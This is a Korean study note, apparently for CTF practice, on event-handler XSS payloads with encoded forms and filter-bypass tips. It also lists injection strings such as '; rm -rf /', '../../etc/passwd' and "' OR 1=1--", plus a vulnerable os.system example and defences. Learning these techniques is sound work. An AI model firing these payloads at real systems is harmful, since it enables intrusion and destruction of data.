## 🧨 이벤트 핸들러 기반 XSS

### 💡 개념 요약

브라우저는 특정 HTML 태그에 이벤트 속성이 있을 때 자동으로 JavaScript 코드를 실행합니다. 이를 악용하여 **이벤트 핸들러 기반 XSS** 공격이 가능합니다. 대표적인 이벤트 핸들러에는 `onerror`, `onload`, `onclick`, `onmouseover` 등이 있습니다.

#### 대표적인 이벤트 핸들러:

| 이벤트           | 설명                  |
| ------------- | ------------------- |
| `onerror`     | 이미지나 리소스 로드 실패 시 실행 |
| `onload`      | 리소스 로드 완료 시 실행      |
| `onclick`     | 클릭 시 실행             |
| `onmouseover` | 마우스 오버 시 실행         |

---

## 🔥 대표 페이로드 예제

### 1. `<img>` + `onerror` (가장 흔한 XSS)

```html
<img src=x onerror=alert(1)>
```

**퍼센트 인코딩**:

```
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

📌 `src=x`는 로드 실패를 유도하여 `onerror`가 실행됩니다.

---

### 2. `<svg>` + `onload` (강력한 스크립트 우회)

```html
<svg onload=alert(1)>
```

**퍼센트 인코딩**:

```
%3Csvg%20onload%3Dalert(1)%3E
```

📌 SVG는 `<script>` 태그가 필터링되어도 우회가 가능하며, 이미지처럼 삽입되기 때문에 필터를 우회하기 쉽습니다.

```html
"><svg/onload=alert(1)>
```

---

### 3. `<iframe>` + `onload`

```html
<iframe onload=alert(1)></iframe>
```

**퍼센트 인코딩**:

```
%3Ciframe%20onload%3Dalert(1)%3E%3C%2Fiframe%3E
```

📌 `<iframe>`은 CTF에서 자주 사용되지는 않지만, 페이지가 렌더링 될 때 실행될 수 있습니다.

---

### 4. `<body>` + `onload` (페이지 로드 시)

```html
<body onload=alert(1)>
```

**퍼센트 인코딩**:

```
%3Cbody%20onload%3Dalert(1)%3E
```

📌 페이지 전체에 삽입되는 경우가 아니라면 거의 작동하지 않지만, SSR 기반 CTF에서는 사용할 수 있습니다.

---

### 5. `<div>` + `onmouseover` (유저 상호작용 필요)

```html
<div onmouseover=alert(1)>XSS</div>
```

**퍼센트 인코딩**:

```
%3Cdiv%20onmouseover%3Dalert(1)%3EXSS%3C%2Fdiv%3E
```

📌 이 페이로드는 사용자가 `div` 요소 위에 마우스를 올리면 실행됩니다.

```html
<div onmouseover="alert(1)">Hover me</div>
```

---

### 6. `document.domain` XSS (도메인 확인용)

```html
<script>
  console.log(document.domain); // "example.com"
</script>
```

* 공격자가 `alert(document.domain)`을 삽입하는 이유는 **XSS 성공 여부를 확인**하려는 것입니다. 공격이 성공하면 페이지에서 현재 도메인(`example.com` 등)이 `alert`로 출력됩니다.

```javascript
// 구글에서 실행해보면
document.domain
// 출력: "google.com"
```

---

## ✅ 필터 우회 팁

| 기법            | 설명                                  |
| ------------- | ----------------------------------- |
| 이벤트 핸들러만 사용하기 | `<script>`가 필터링돼도 작동할 수 있음          |
| 퍼센트 인코딩       | `<` → `%3C`, `>` → `%3E`와 같은 인코딩 방법 |
| 속성값           | 속성 내 JavaScript 코드 삽입 가능            |

---

## ⚠️ `<` 차단만으로 막을 수 없는 대표적 공격 유형들

| 공격 종류                        | `<` 포함 여부 | 설명                              |
| ---------------------------- | --------- | ------------------------------- |
| **SQL Injection**            | ❌ 포함 안 됨  | 예: `' OR 1=1--` 같은 문자열로 로그인 우회  |
| **Command Injection**        | ❌         | 예: `; rm -rf /`                 |
| **Path Traversal**           | ❌         | 예: `../../etc/passwd`           |
| **HTTP Parameter Pollution** | ❌         | 예: `?id=123&id=456` 처럼 중복 파라미터  |
| **Header Injection**         | ❌         | 응답 헤더 조작 (`\r\n` 삽입)            |
| **JSON 기반 XSS**              | ✅ 또는 ❌    | JSON 응답에 JavaScript 형태로 값 삽입 가능 |

---

## 📌 **Command Injection** (추가 설명)

### 공격 방식

```bash
someinput; rm -rf /
```

서버에서 입력값을 OS 명령어에 직접 넘길 때 발생할 수 있습니다.

```python
os.system("ping " + user_input)
```

### 🛡️ 방어법

* OS 명령어 사용 시 **입력값을 절대 직접 연결하지 않기**
* `subprocess.run` 등에서 `shell=False` 사용
* allowlist로 명령어 파라미터 제한

---

## 결론

**이벤트 핸들러 기반 XSS**는 HTML 태그의 이벤트 속성을 악용하는 공격입니다. 공격자는 `onerror`, `onload`, `onclick`, `onmouseover` 등의 이벤트를 사용하여 JavaScript 코드를 실행시킬 수 있습니다. 이를 막기 위해서는 필터링된 입력값을 처리할 때 각종 우회 기법을 고려하고, JavaScript 코드 삽입을 방지하기 위한 조치가 필요합니다.
